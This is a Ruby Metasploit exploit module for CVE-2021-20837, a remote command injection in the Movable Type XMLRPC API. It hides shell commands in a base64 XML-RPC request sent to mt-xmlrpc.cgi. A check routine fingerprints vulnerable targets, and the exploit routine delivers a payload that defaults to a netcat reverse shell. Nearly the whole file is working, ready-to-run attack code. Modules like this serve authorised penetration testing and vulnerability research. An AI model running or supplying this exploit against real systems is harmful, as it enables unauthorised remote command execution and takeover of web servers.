##
## https://github.com/orangmuda/CVE-2021-20837
##
###################################################


class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Movable Type XMLRPC API Remote Command Injection",
      'Description'    => %q{
        This module exploit Movable Type XMLRPC API Remote Command Injection.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Etienne Gervais', # author & msf module,
          'Charl-Alexandre Le Brun' # author & msf module
        ],
      'References'     =>
        [
          ['CVE', '2021-20837'],
          ['URL', 'https://movabletype.org/'],
          ['URL', 'https://nemesis.sh/']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => false,
        },
      'Platform'       => ['linux'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'DisclosureDate' => "2021-10-20",
      'DefaultTarget'  => 0,
      'Targets' => [
            [
              'Automatic (Unix In-Memory)',
              {
                'Platform' => 'unix',
                'Arch' => ARCH_CMD,
                'Type' => :unix_memory,
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' }
              }
            ]
          ]
    ))
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the MovableType', '/cgi-bin/mt/'])
      ], self.class
    )
  end

  def cmd_to_xml(cmd, opts={})
    base64_cmd = Rex::Text.encode_base64("`"+cmd+"`")
    xml_body = <<~THISSTRING
<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>mt.handler_to_coderef</methodName>
      <params>
        <param>
          <value>
            <base64>
            #{base64_cmd}
            </base64>
          </value>
        </param>
      </params>
    </methodCall>
    THISSTRING
  end

  def check
    begin
      fingerprint = Rex::Text.rand_text_alpha(32)
      command_payload = cmd_to_xml("echo "+fingerprint)

      res = send_request_cgi({
                            'method'        => 'POST',
                            'uri'           => normalize_uri(target_uri.path,'mt-xmlrpc.cgi'),
                            'ctype'         => 'text/xml; charset=UTF-8',
                            'data'          => command_payload
                          })

      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}") if res.code != 200

      if res && res.body.include?("Can't locate "+fingerprint)
        return Exploit::CheckCode::Vulnerable
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe
  end
  
  def exploit
    begin
      command_payload = cmd_to_xml(payload.raw)

      res = send_request_cgi({
                            'method'        => 'POST',
                            'uri'           => normalize_uri(target_uri.path,'mt-xmlrpc.cgi'),
                            'ctype'         => 'text/xml; charset=UTF-8',
                            'data'          => command_payload
                          })

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end

  end
end
